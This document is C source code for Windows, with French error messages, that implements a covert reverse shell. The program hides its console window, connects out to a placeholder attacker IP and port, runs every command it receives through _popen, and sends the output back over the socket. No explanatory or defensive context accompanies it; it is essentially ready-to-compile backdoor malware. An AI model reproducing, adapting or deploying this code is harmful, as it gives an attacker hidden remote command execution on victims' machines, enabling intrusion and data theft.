#pragma comment(lib, "ws2_32.lib")

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>

#define _WIN32_WINNT 0x0500

#define PORT XXXXX
#define CLIENT "XXXX.XXXX.XXXX.XXXX"

int main(void)
{
    HWND fenetre = GetConsoleWindow();
    ShowWindow(fenetre, SW_MINIMIZE);
    ShowWindow(fenetre, SW_HIDE);

    WSADATA WSAData;

    int erreur = WSAStartup(MAKEWORD(2, 2), &WSAData);

    if (erreur != 0)
    {
        fprintf(stderr, "Erreur lors de l'initialisation de Winsock : %d\n", erreur);
        return 1;
    }

    SOCKET sock;
    SOCKADDR_IN sin;

    char buffer[999] = "";

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        fprintf(stderr, "Erreur lors de la création de la socket : %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    sin.sin_addr.s_addr = inet_addr(CLIENT);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(PORT);

    if (connect(sock, (SOCKADDR*)&sin, sizeof(sin)) == SOCKET_ERROR)
    {
        fprintf(stderr, "Erreur lors de la connexion : %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    while (recv(sock, buffer, sizeof(buffer), 0) != SOCKET_ERROR)
    {
        FILE* fp;
        char path[999];
        char responseBuffer[9999] = "";

        fp = _popen(buffer, "r");

        while (fgets(path, sizeof(path) - 1, fp) != NULL)
        {
            strcat(responseBuffer, path);
        }

        send(sock, responseBuffer, strlen(responseBuffer) + 1, 0);

        _pclose(fp);
    }

    closesocket(sock);
    WSACleanup();

    return 0;
}
